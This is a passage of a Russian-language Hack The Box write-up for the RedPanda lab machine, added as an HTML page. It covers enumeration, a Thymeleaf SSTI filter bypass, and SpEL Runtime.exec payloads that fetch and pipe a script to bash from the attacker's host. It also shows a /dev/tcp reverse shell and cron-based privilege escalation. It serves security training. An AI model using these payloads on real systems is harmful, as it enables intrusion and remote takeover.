@@ -1,0 +1,1078 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="robots" content="noindex" />
+  <title>RedPanda — райтап (RU) — CyberMaks</title>
+  <meta name="description" content="RedPanda Hack The Box — русская версия райтапа: SSTI в Thymeleaf, RCE через SpEL, path traversal через EXIF и XXE до ключа root." />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=DM+Mono:ital,wght@0,300;0,400;0,500;1,300&family=DM+Sans:wght@300;400;500;600&display=swap" rel="stylesheet" />
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --bg:       #0b0f14;
+      --bg-2:     #0f1419;
+      --bg-3:     #141b22;
+      --bg-code:  #0d1117;
+      --border:   #1e2730;
+      --border-2: #253040;
+      --text:     #c8d0da;
+      --text-dim: #6b7a8d;
+      --text-faint: #3a4552;
+      --accent:   #4d9de0;
+      --accent-dim: #2d6fa8;
+      --green:    #34c759;
+      --yellow:   #ff9f0a;
+      --red:      #ff453a;
+      --mono: 'DM Mono', monospace;
+      --sans: 'DM Sans', sans-serif;
+    }
+
+    html { scroll-behavior: smooth; }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: var(--sans);
+      font-size: 15px;
+      line-height: 1.7;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    nav {
+      position: fixed;
+      top: 0; left: 0; right: 0;
+      z-index: 100;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 2rem;
+      height: 56px;
+      background: rgba(11,15,20,0.85);
+      backdrop-filter: blur(12px);
+      border-bottom: 1px solid var(--border);
+    }
+    .nav-brand {
+      font-family: var(--mono);
+      font-size: 13px;
+      color: var(--accent);
+      text-decoration: none;
+      letter-spacing: 0.04em;
+    }
+    .nav-links {
+      display: flex;
+      gap: 2rem;
+      list-style: none;
+    }
+    .nav-links a {
+      font-size: 13px;
+      color: var(--text-dim);
+      text-decoration: none;
+      letter-spacing: 0.02em;
+      transition: color 0.15s;
+    }
+    .nav-links a:hover { color: var(--text); }
+
+    .page-wrap {
+      max-width: 780px;
+      margin: 0 auto;
+      padding: 100px 2rem 80px;
+    }
+
+    .back-link {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      font-family: var(--mono);
+      font-size: 12px;
+      color: var(--text-dim);
+      text-decoration: none;
+      margin-bottom: 2.5rem;
+      letter-spacing: 0.03em;
+      transition: color 0.15s;
+    }
+    .back-link:hover { color: var(--accent); }
+    .back-link svg { width: 14px; height: 14px; }
+
+    .post-header { margin-bottom: 2.5rem; }
+
+    .post-meta {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 1rem;
+      flex-wrap: wrap;
+    }
+    .badge {
+      font-family: var(--mono);
+      font-size: 11px;
+      letter-spacing: 0.06em;
+      padding: 3px 9px;
+      border-radius: 3px;
+      text-transform: uppercase;
+    }
+    .badge-platform { background: rgba(77,157,224,0.1); color: var(--accent); border: 1px solid rgba(77,157,224,0.2); }
+    .badge-medium   { background: rgba(255,159,10,0.1);  color: var(--yellow); border: 1px solid rgba(255,159,10,0.2); }
+    .badge-easy     { background: rgba(52,199,89,0.08);  color: #34c759;       border: 1px solid rgba(52,199,89,0.2); }
+    .badge-tag      { background: rgba(255,255,255,0.04); color: var(--text-dim); border: 1px solid var(--border); }
+
+    .post-title {
+      font-family: var(--sans);
+      font-size: 28px;
+      font-weight: 600;
+      color: #e8edf3;
+      line-height: 1.25;
+      letter-spacing: -0.3px;
+      margin-bottom: 0.75rem;
+    }
+    .post-date {
+      font-family: var(--mono);
+      font-size: 12px;
+      color: var(--text-faint);
+      letter-spacing: 0.04em;
+    }
+
+    .divider {
+      height: 1px;
+      background: var(--border);
+      margin: 2rem 0;
+    }
+
+    .chain-block {
+      background: var(--bg-2);
+      border: 1px solid var(--border);
+      border-left: 2px solid var(--accent);
+      border-radius: 6px;
+      padding: 1.25rem 1.5rem;
+      margin-bottom: 2.5rem;
+    }
+    .chain-block h3 {
+      font-family: var(--mono);
+      font-size: 11px;
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+      color: var(--text-dim);
+      margin-bottom: 1rem;
+    }
+    .chain-step {
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+      margin-bottom: 8px;
+    }
+    .chain-step:last-child { margin-bottom: 0; }
+    .chain-arrow {
+      font-family: var(--mono);
+      color: var(--accent-dim);
+      font-size: 12px;
+      padding-top: 1px;
+      flex-shrink: 0;
+    }
+    .chain-text {
+      font-family: var(--mono);
+      font-size: 13px;
+      color: var(--text);
+      line-height: 1.5;
+    }
+
+    .section { margin-bottom: 2.5rem; }
+    .section-num {
+      font-family: var(--mono);
+      font-size: 11px;
+      color: var(--accent);
+      letter-spacing: 0.08em;
+      margin-bottom: 4px;
+    }
+    h2 {
+      font-size: 18px;
+      font-weight: 600;
+      color: #e8edf3;
+      letter-spacing: -0.2px;
+      margin-bottom: 1rem;
+    }
+    p { color: var(--text); margin-bottom: 0.85rem; }
+    p:last-child { margin-bottom: 0; }
+
+    .callout {
+      background: rgba(77,157,224,0.06);
+      border: 1px solid rgba(77,157,224,0.15);
+      border-left: 2px solid var(--accent);
+      border-radius: 4px;
+      padding: 0.85rem 1.1rem;
+      font-size: 13.5px;
+      color: var(--text);
+      margin: 1rem 0;
+    }
+    .callout.warn {
+      background: rgba(255,159,10,0.06);
+      border-color: rgba(255,159,10,0.15);
+      border-left-color: var(--yellow);
+    }
+    .callout.tip {
+      background: rgba(52,199,89,0.06);
+      border-color: rgba(52,199,89,0.15);
+      border-left-color: var(--green);
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin: 1rem 0;
+      font-size: 13.5px;
+    }
+    thead tr { border-bottom: 1px solid var(--border-2); }
+    th {
+      font-family: var(--mono);
+      font-size: 11px;
+      text-transform: uppercase;
+      letter-spacing: 0.07em;
+      color: var(--text-dim);
+      text-align: left;
+      padding: 8px 12px 8px 0;
+      font-weight: 400;
+    }
+    td {
+      padding: 8px 12px 8px 0;
+      color: var(--text);
+      border-bottom: 1px solid var(--border);
+      font-family: var(--mono);
+      font-size: 13px;
+    }
+    tbody tr:last-child td { border-bottom: none; }
+    td:first-child { color: var(--accent); }
+
+    .code-block { position: relative; margin: 1rem 0; }
+    .code-label {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      background: var(--bg-3);
+      border: 1px solid var(--border);
+      border-bottom: none;
+      border-radius: 5px 5px 0 0;
+      padding: 6px 12px;
+    }
+    .code-lang {
+      font-family: var(--mono);
+      font-size: 11px;
+      color: var(--text-faint);
+      letter-spacing: 0.06em;
+      text-transform: uppercase;
+    }
+    .copy-btn {
+      font-family: var(--mono);
+      font-size: 10px;
+      color: var(--text-dim);
+      background: none;
+      border: none;
+      cursor: pointer;
+      letter-spacing: 0.04em;
+      transition: color 0.15s;
+      padding: 2px 4px;
+    }
+    .copy-btn:hover { color: var(--accent); }
+    pre {
+      background: var(--bg-code);
+      border: 1px solid var(--border);
+      border-radius: 0 0 5px 5px;
+      padding: 1rem 1.1rem;
+      overflow-x: auto;
+      font-family: var(--mono);
+      font-size: 13px;
+      line-height: 1.65;
+      color: var(--text);
+    }
+    code {
+      font-family: var(--mono);
+      font-size: 12.5px;
+      background: rgba(255,255,255,0.05);
+      border: 1px solid var(--border);
+      padding: 1px 5px;
+      border-radius: 3px;
+      color: var(--text);
+    }
+
+    .cm { color: var(--text-faint); }
+    .kw { color: var(--accent); }
+    .st { color: #a8d8a8; }
+    .nu { color: var(--yellow); }
+    .fn { color: #e0c9f5; }
+    .rd { color: var(--red); }
+
+    .creds-table td:first-child { color: var(--text-dim); }
+    .creds-table td:nth-child(2) { color: var(--red); }
+    .creds-table td:nth-child(3) { color: var(--text-dim); font-size: 12px; }
+
+    .takeaway {
+      display: flex;
+      gap: 12px;
+      align-items: flex-start;
+      margin-bottom: 0.75rem;
+    }
+    .takeaway:last-child { margin-bottom: 0; }
+    .takeaway-dot {
+      width: 5px;
+      height: 5px;
+      border-radius: 50%;
+      background: var(--accent);
+      flex-shrink: 0;
+      margin-top: 8px;
+    }
+    .takeaway-text { font-size: 14px; color: var(--text); }
+
+    .room-ref {
+      font-family: var(--mono);
+      font-size: 12px;
+      color: var(--text-faint);
+      text-decoration: none;
+      letter-spacing: 0.03em;
+      display: inline-block;
+      margin-top: 6px;
+      transition: color 0.15s;
+    }
+    .room-ref:hover { color: var(--accent); }
+
+    .ref-link {
+      font-family: var(--mono);
+      font-size: 12px;
+      color: var(--accent-dim);
+      text-decoration: none;
+      letter-spacing: 0.02em;
+      transition: color 0.15s;
+    }
+    .ref-link:hover { color: var(--accent); }
+
+    .vuln-table td:first-child  { color: var(--accent); }
+    .vuln-table td:nth-child(2) { color: var(--text-dim); font-size: 12.5px; }
+    .vuln-table td:nth-child(3) { color: var(--text-faint); font-size: 12px; }
+
+    footer {
+      border-top: 1px solid var(--border);
+      margin-top: 4rem;
+      padding-top: 2rem;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .footer-brand {
+      font-family: var(--mono);
+      font-size: 12px;
+      color: var(--text-faint);
+    }
+    .footer-links { display: flex; gap: 1.5rem; }
+    .footer-links a {
+      font-family: var(--mono);
+      font-size: 12px;
+      color: var(--text-faint);
+      text-decoration: none;
+      transition: color 0.15s;
+    }
+    .footer-links a:hover { color: var(--accent); }
+
+    @media (max-width: 600px) {
+      .nav-links { display: none; }
+      .post-title { font-size: 22px; }
+      footer { flex-direction: column; gap: 1rem; }
+    }
+
+    .shot { border: 1px solid var(--border); border-radius: 6px; overflow: hidden; margin: 18px 0; }
+    .sh { display: flex; align-items: center; justify-content: space-between; padding: 8px 14px; background: rgba(255,255,255,0.02); border-bottom: 1px solid var(--border); }
+    .sl { font-family: var(--mono); font-size: 10px; color: var(--text-faint); letter-spacing: 0.1em; text-transform: uppercase; }
+    .ss { font-family: var(--mono); font-size: 10px; color: var(--accent); }
+    .shot img { display: block; width: 100%; height: auto; background: var(--bg-3); }
+    .sc { padding: 9px 14px; font-size: 11px; color: var(--text-faint); font-style: italic; border-top: 1px solid var(--border); background: var(--bg-2); }
+    h3.sub { font-size: 15px; font-weight: 600; color: #e8edf3; margin: 1.5rem 0 0.75rem; }
+    @media (max-width: 600px) { .page-wrap { padding: 90px 16px 60px; } }
+
+    /* ---- heart overlay ---- */
+    #heart-overlay {
+      position: fixed; inset: 0; z-index: 1000;
+      display: flex; flex-direction: column; align-items: center; justify-content: center;
+      background: rgba(6,8,12,0.92);
+      backdrop-filter: blur(6px);
+      cursor: pointer;
+      transition: opacity 0.8s ease;
+    }
+    #heart-overlay.hide { opacity: 0; pointer-events: none; }
+    #heart-canvas { width: min(420px, 90vw); height: min(380px, 80vw); }
+    .heart-text {
+      font-family: var(--sans);
+      font-size: clamp(20px, 5vw, 30px);
+      font-weight: 600;
+      color: #ffd1dc;
+      text-align: center;
+      margin-top: 8px;
+      padding: 0 16px;
+      opacity: 0;
+      transform: translateY(10px);
+      transition: opacity 1.2s ease, transform 1.2s ease;
+      text-shadow: 0 0 18px rgba(255,69,109,0.55);
+    }
+    .heart-sub {
+      font-family: var(--mono);
+      font-size: clamp(12px, 3vw, 14px);
+      color: #ff8fab;
+      margin-top: 10px;
+      text-align: center;
+      padding: 0 16px;
+      opacity: 0;
+      transition: opacity 1.2s ease 0.8s;
+    }
+    .heart-hint {
+      position: absolute; bottom: 24px;
+      font-family: var(--mono); font-size: 11px; color: var(--text-faint);
+      letter-spacing: 0.06em;
+    }
+    #heart-overlay.show-text .heart-text { opacity: 1; transform: none; }
+    #heart-overlay.show-text .heart-sub { opacity: 1; }
+    #heart-replay {
+      position: fixed; right: 18px; bottom: 18px; z-index: 900;
+      width: 42px; height: 42px; border-radius: 50%;
+      border: 1px solid rgba(255,69,109,0.35);
+      background: rgba(255,69,109,0.1);
+      color: #ff456d; font-size: 18px; cursor: pointer;
+      transition: transform 0.2s, background 0.2s;
+    }
+    #heart-replay:hover { transform: scale(1.1); background: rgba(255,69,109,0.2); }
+  </style>
+</head>
+<body>
+
+<div id="heart-overlay" role="dialog" aria-label="Спасибо, дорогая Codistry">
+  <canvas id="heart-canvas"></canvas>
+  <div class="heart-text">Спасибо, дорогая Codistry ❤</div>
+  <div class="heart-sub">ты сама знаешь за что</div>
+  <div class="heart-hint">нажми, чтобы читать райтап</div>
+</div>
+<button id="heart-replay" title="Ещё раз ❤" aria-label="Показать сердечко ещё раз">❤</button>
+
+<nav>
+  <a class="nav-brand" href="../index.html">CyberMaks</a>
+  <ul class="nav-links">
+    <li><a href="../index.html#case-studies">Case Studies</a></li>
+    <li><a href="redpanda.html">English version</a></li>
+  </ul>
+</nav>
+
+<div class="page-wrap">
+
+  <a class="back-link" href="../index.html">
+    <svg viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+      <path d="M10 3L5 8l5 5"/>
+    </svg>
+    Case Studies
+  </a>
+
+  <header class="post-header">
+    <div class="post-meta">
+      <span class="badge badge-platform">Hack The Box</span>
+      <span class="badge badge-easy">Easy</span>
+      <span class="badge badge-tag">ssti</span>
+      <span class="badge badge-tag">spring-boot</span>
+      <span class="badge badge-tag">path-traversal</span>
+      <span class="badge badge-tag">xxe</span>
+      <span class="badge badge-tag">cron-abuse</span>
+    </div>
+    <h1 class="post-title">RedPanda</h1>
+    <div class="post-date">2026-11-20 · русская версия</div>
+    <a class="room-ref" href="https://app.hackthebox.com/machines/RedPanda" target="_blank" rel="noopener">app.hackthebox.com/machines/RedPanda ↗</a>
+  </header>
+
+  <div class="chain-block">
+    <h3>Цепочка атаки</h3>
+    <div class="chain-step"><span class="chain-arrow">01</span><span class="chain-text">Nmap → поиск на Spring Boot на :8080 → /stats палит woodenk и damian</span></div>
+    <div class="chain-step"><span class="chain-arrow">02</span><span class="chain-text">SSTI в /search → $ _ ~ запрещены → обход через SpEL-выражение *{...}</span></div>
+    <div class="chain-step"><span class="chain-arrow">03</span><span class="chain-text">Runtime.exec() → reverse shell от woodenk (группа logs) → user flag</span></div>
+    <div class="chain-step"><span class="chain-arrow">04</span><span class="chain-text">pspy → cron от root каждые 2 минуты запускает LogParser jar</span></div>
+    <div class="chain-step"><span class="chain-arrow">05</span><span class="chain-text">Инъекция в лог через User-Agent → path traversal → EXIF Artist → наш XML → XXE → /root/.ssh/id_rsa → root</span></div>
+  </div>
+
+  <div class="divider"></div>
+
+  <!-- SECTION 1 -->
+  <div class="section">
+    <div class="section-num">01 — Разведка</div>
+    <h2>Nmap</h2>
+    <p>Первым делом — сканируем порты с дефолтными скриптами, чтобы понять, какая у нас поверхность атаки.</p>
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">bash</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>sudo nmap -sS -sV -sC -F 10.129.99.184</pre>
+    </div>
+    <table>
+      <thead><tr><th>Порт</th><th>Сервис</th><th>Заметка</th></tr></thead>
+      <tbody>
+        <tr><td>22</td><td>OpenSSH 8.2p1</td><td>Ubuntu 20.04</td></tr>
+        <tr><td>8080</td><td>http-proxy</td><td>Red Panda Search | Made with Spring Boot</td></tr>
+      </tbody>
+    </table>
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">вывод — fingerprint-strings (сокращено)</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>|_http-title: Red Panda Search | Made with Spring Boot
+|     &lt;meta author=<span class="st">"wooden_k"</span>&gt;
+|     &lt;title&gt;Red Panda Search | Made with Spring Boot&lt;/title&gt;</pre>
+    </div>
+    <p>Мы даже не открыли сайт, а подсказки уже есть. Фреймворк — <strong>Spring Boot</strong>, основная функция — поиск панд, а Spring Boot значит <strong>Java</strong> на бэкенде. Запоминаем: именно это определит, какие пейлоады мы будем писать дальше.</p>
+    <div class="shot">
+      <div class="sh"><span class="sl">10.129.99.184:8080</span><span class="ss">200 OK</span></div>
+      <img src="../assets/img/redpanda/01.png" alt="Главная страница Red Panda Search на Spring Boot, порт 8080, с одним полем поиска" loading="lazy" />
+      <div class="sc">Одно поле ввода. Всё, что будет дальше, начинается с него.</div>
+    </div>
+  </div>
+
+  <!-- SECTION 2 -->
+  <div class="section">
+    <div class="section-num">02 — Перечисление веба</div>
+    <h2>Поиск контента</h2>
+    <p>Прежде чем ковырять поиск, убедимся, что больше ничего не торчит наружу. dirsearch с дефолтным словарём:</p>
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">bash</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>dirsearch -u http://10.129.99.184:8080</pre>
+    </div>
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">вывод (сокращено)</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>[21:08:32] 500 -   86B  - /error
+[21:08:45] 405 -  117B  - /search      <span class="cm"># только POST</span>
+[21:08:48] 200 -  987B  - <span class="st">/stats</span></pre>
+    </div>
+    <div class="shot">
+      <div class="sh"><span class="sl">10.129.99.184:8080/stats?author=woodenk</span><span class="ss">200 OK</span></div>
+      <img src="../assets/img/redpanda/02.png" alt="Страница статистики автора woodenk: /img/greg.jpg, /img/hungy.jpg, /img/smooch.jpg, /img/smiley.jpg по 0 просмотров, ссылка Export table и авторы woodenk и damian" loading="lazy" />
+      <div class="sc">Два автора, счётчик просмотров на каждую картинку и «Export table». Запомни счётчик — он вернётся, когда будем брать root.</div>
+    </div>
+    <p><code>/stats</code> даёт нам два имени: <strong>woodenk</strong> и <strong>damian</strong>. Я покидал в параметр <code>author</code> LFI-пейлоады в разных кодировках — ничего. Эндпоинт работает ровно так, как должен. Возвращаемся к поиску.</p>
+  </div>
+
+  <!-- SECTION 3 -->
+  <div class="section">
+    <div class="section-num">03 — Первичный доступ</div>
+    <h2>SSTI в /search</h2>
+    <p>Разработчики на Spring Boot обожают серверные шаблонизаторы (чаще всего Thymeleaf). Мы вводим текст в поиск, и он сразу отражается в ответе — это ровно тот паттерн, где стоит искать инъекцию в шаблон.</p>
+
+    <div class="callout">
+      <strong>Что такое SSTI?</strong><br><br>
+      Шаблонизатор собирает страницу, совмещая фиксированный шаблон с динамическими данными. Это безопасно, пока ввод пользователя передаётся <em>как данные</em>. Баг появляется, когда разработчик вклеивает ввод <em>прямо в сам шаблон</em> — тогда движок считает наш текст кодом шаблона и выполняет его на сервере. Отправил <code>{{9*9}}</code>, получил <code>81</code> вместо строки — значит, движок исполняет твои выражения. От арифметики до чтения файлов и выполнения команд обычно рукой подать — и, в отличие от XSS, всё это происходит на сервере, а не в чьём-то браузере.<br><br>
+      <a class="ref-link" href="https://www.geeksforgeeks.org/computer-networks/what-is-server-side-template-injection/" target="_blank" rel="noopener">GeeksforGeeks: What is SSTI ↗</a>
+    </div>
+
+    <h3 class="sub">Обнаружение</h3>
+    <p>Первая проба — классика <code>${7*7}</code>. Если движок вычислит выражение, увидим <code>49</code>.</p>
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">bash</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>curl -s -X POST http://10.129.99.184:8080/search --data-urlencode <span class="st">'name=${7*7}'</span></pre>
+    </div>
+    <div class="shot">
+      <div class="sh"><span class="sl">POST /search — ${7*7}</span><span class="ss">banned</span></div>
+      <img src="../assets/img/redpanda/03.png" alt="Страница результатов: You searched for: Error occured: banned characters" loading="lazy" />
+      <div class="sc">Чёрный список. Значит, разработчик уже знал, что здесь что-то опасно.</div>
+    </div>
+    <p>Приложение запрещает какие-то символы. Вместо угадывания пусть ffuf найдёт их сам — по одному символу на запрос, матчим по слову <code>banned</code>:</p>
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">bash</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>ffuf -u http://10.129.99.184:8080/search -X POST \
+     -H <span class="st">'Content-Type: application/x-www-form-urlencoded'</span> \
+     -d <span class="st">'name=FUZZ'</span> \
+     -w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt \
+     -mr <span class="st">'banned'</span></pre>
+    </div>
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">вывод</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre><span class="rd">$</span>    [Status: 200, Size: 755, Words: 159, Lines: 29]
+<span class="rd">_</span>    [Status: 200, Size: 755, Words: 159, Lines: 29]
+<span class="rd">~</span>    [Status: 200, Size: 755, Words: 159, Lines: 29]</pre>
+    </div>
+
+    <div class="callout tip">Три запрещённых символа — и по-настоящему им был важен только <code>$</code>. В Thymeleaf больше одного синтаксиса выражений: <code>${...}</code> — переменные, <code>*{...}</code> — selection, <code>#{...}</code> — сообщения, <code>@{...}</code> — ссылки. <code>*{...}</code> вычисляет SpEL ровно так же, как <code>${...}</code>. Запретить один символ из семейства в четыре — это не фильтр, это пожелание.</div>
+
+    <p>Proof of concept через <code>#{7*7}</code>:</p>
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">bash</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>curl -s -X POST http://10.129.99.184:8080/search --data-urlencode <span class="st">'name=#{7*7}'</span></pre>
+    </div>
+    <div class="shot">
+      <div class="sh"><span class="sl">POST /search — #{7*7}</span><span class="ss">evaluated</span></div>
+      <img src="../assets/img/redpanda/04.png" alt="Страница результатов: You searched for: ??49_en_US??" loading="lazy" />
+      <div class="sc"><code>??49_en_US??</code> — <code>#{}</code> это выражение сообщения, поэтому Thymeleaf ищет ключ сообщения <code>49</code>, не находит и оборачивает его в <code>??...??</code>. Но сначала он посчитал. SSTI подтверждена.</div>
+    </div>
+  </div>
+
+  <!-- SECTION 4 -->
+  <div class="section">
+    <div class="section-num">04 — RCE</div>
+    <h2>SpEL → Runtime.exec() → Reverse Shell</h2>
+    <p>Уязвимость подтверждена — теперь цель удалённое выполнение кода. SpEL даёт доступ к любому Java-классу через <code>T(...)</code>, так что <code>java.lang.Runtime</code> в одном выражении от нас. Самое чистое доказательство, что команды выполняются на сервере, — заставить сервер постучаться на машину, которую контролирую я.</p>
+
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">bash — атакующий</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre><span class="cm"># shell.sh</span>
+bash -i &gt;&amp; /dev/tcp/10.10.15.118/1337 0&gt;&amp;1
+
+python3 -m http.server 8000     <span class="cm"># терминал 1 — раздаёт shell.sh</span>
+nc -nvlp 1337                   <span class="cm"># терминал 2 — ловит шелл</span></pre>
+    </div>
+
+    <p>Первый callback — обычный <code>wget</code>:</p>
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">spel</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>*{T(java.lang.Runtime).getRuntime().exec(<span class="st">'wget 10.10.15.118:8000/shell.sh'</span>)}</pre>
+    </div>
+    <div class="shot">
+      <div class="sh"><span class="sl">POST /search — Runtime.exec()</span><span class="ss">Process spawned</span></div>
+      <img src="../assets/img/redpanda/05.png" alt="Страница результатов: You searched for: Process[pid=2146, exitValue=&quot;not exited&quot;]" loading="lazy" />
+      <div class="sc"><code>Process[pid=2146]</code> — сервер буквально сообщает, что запустил наш процесс. Через секунду GET прилетел на мой http.server.</div>
+    </div>
+
+    <p><code>Runtime.exec(String)</code> не понимает shell — ни пайпов, ни редиректов. Оборачиваем команду в <code>/bin/sh -c</code> и выводим stdout обратно на страницу через <code>IOUtils.toString()</code>, чтобы видеть, что происходит:</p>
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">spel — reverse shell</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(new String[]{<span class="st">'/bin/sh'</span>,<span class="st">'-c'</span>,<span class="st">'curl -sS 10.10.15.118:8000/shell.sh | bash 2&gt;&amp;1'</span>}).getInputStream())}</pre>
+    </div>
+    <div class="callout warn">Отправляй через Burp или <code>curl --data-urlencode</code>. Вставить <code>|</code>, <code>&amp;</code> и <code>+</code> в сырое тело формы — верный способ потратить двадцать минут на отладку URL-кодирования вместо цели.</div>
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">bash — листенер</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>❯ nc -nvlp 1337
+Connection received on 10.129.99.184 34868
+woodenk@redpanda:/tmp/hsperfdata_woodenk$ cat /home/woodenk/user.txt
+<span class="st">1ca24039************************</span></pre>
+    </div>
+    <p>Шелл от <code>woodenk</code>. User flag есть.</p>
+  </div>
+
+  <!-- SECTION 5 -->
+  <div class="section">
+    <div class="section-num">05 — Повышение привилегий</div>
+    <h2>Разведка от woodenk</h2>
+    <p>Приложение живёт в <code>/opt</code> — оттуда и начал грепать. Креды от базы лежат прямо в исходнике контроллера:</p>
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">bash</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>woodenk@redpanda:/opt$ grep -r <span class="st">"RedPanda"</span>
+panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java:
+    conn = DriverManager.getConnection(<span class="st">"jdbc:mysql://localhost:3306/red_panda"</span>, <span class="st">"woodenk"</span>, <span class="rd">"RedPanda*****"</span>);</pre>
+    </div>
+    <p>Переиспользование пароля — те же креды подходят к SSH. С нормальным TTY жить проще, но обрати внимание на одну разницу между сессиями:</p>
+    <div class="callout warn">Reverse shell пришёл от Java-процесса, который работает как <code>woodenk</code> <strong>с группой <code>logs</code></strong>. Свежая SSH-сессия <code>woodenk</code> этой группы не получает — группы принадлежат процессу, а не паролю. На практике <code>logs</code> даёт только видимость: читать <code>/opt/panda_search/redpanda.log</code> и <code>/credits</code>, чтобы проверять себя. Самому эксплойту она не нужна — строку в лог за нас пишет веб-приложение, а наши файлы лежат в нашем же домашнем каталоге.</div>
+
+    <h3 class="sub">pspy — что запускается от root?</h3>
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">bash</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>woodenk@redpanda:/tmp$ wget 10.10.15.118:8000/pspy64
+woodenk@redpanda:/tmp$ chmod +x pspy64 &amp;&amp; ./pspy64</pre>
+    </div>
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">вывод — через пару минут</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>CMD: UID=0  PID=2923 | /usr/sbin/CRON -f
+CMD: UID=0  PID=2924 | /bin/sh -c /root/run_credits.sh
+CMD: UID=0  PID=2926 | <span class="rd">java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar</span></pre>
+    </div>
+    <p>Java-приложение, запускаемое root по таймеру. И в названии <em>credit-score</em> — это тот самый счётчик «1 просмотр = 1 creditpoint» из <code>/stats</code>. Что-то читает логи и обновляет просмотры от root. Читаем.</p>
+  </div>
+
+  <!-- SECTION 6 -->
+  <div class="section">
+    <div class="section-num">06 — Анализ исходников</div>
+    <h2>LogParser — App.java</h2>
+    <p>Исходник лежит рядом с jar в <code>/opt/credit-score/LogParser/final/src/</code>. Вот логика, урезанная до важного:</p>
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">java — App.java (фрагмент)</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre><span class="kw">public static</span> Map <span class="fn">parseLog</span>(String line) {
+    String[] strings = line.<span class="fn">split</span>(<span class="st">"\\|\\|"</span>);          <span class="cm">// режем по ||</span>
+    map.<span class="fn">put</span>(<span class="st">"status_code"</span>, Integer.<span class="fn">parseInt</span>(strings[<span class="nu">0</span>]));
+    map.<span class="fn">put</span>(<span class="st">"ip"</span>,          strings[<span class="nu">1</span>]);
+    map.<span class="fn">put</span>(<span class="st">"user_agent"</span>,  strings[<span class="nu">2</span>]);
+    map.<span class="fn">put</span>(<span class="st">"uri"</span>,         strings[<span class="nu">3</span>]);          <span class="cm">// индекс, а не парсер</span>
+}
+
+<span class="kw">public static boolean</span> <span class="fn">isImage</span>(String filename) {
+    <span class="kw">return</span> filename.<span class="fn">contains</span>(<span class="st">".jpg"</span>);                <span class="cm">// где угодно в строке</span>
+}
+
+<span class="kw">public static</span> String <span class="fn">getArtist</span>(String uri) {
+    String fullpath = <span class="st">"/opt/panda_search/src/main/resources/static"</span> + <span class="rd">uri</span>;
+    <span class="cm">// ... читает EXIF, возвращает тег "Artist"</span>
+}
+
+<span class="kw">public static void</span> <span class="fn">addViewTo</span>(String path, String uri) {
+    SAXBuilder saxBuilder = <span class="kw">new</span> <span class="fn">SAXBuilder</span>();       <span class="cm">// дефолтный конфиг — DTD разрешены</span>
+    Document doc = saxBuilder.<span class="fn">build</span>(<span class="kw">new</span> File(path));
+    <span class="cm">// ... если &lt;uri&gt; совпал: views++, totalviews++</span>
+    xmlOutput.<span class="fn">output</span>(doc, writer);                    <span class="cm">// записывает разобранный документ обратно</span>
+}
+
+<span class="kw">public static void</span> <span class="fn">main</span>(String[] args) {
+    <span class="cm">// для каждой строки /opt/panda_search/redpanda.log:</span>
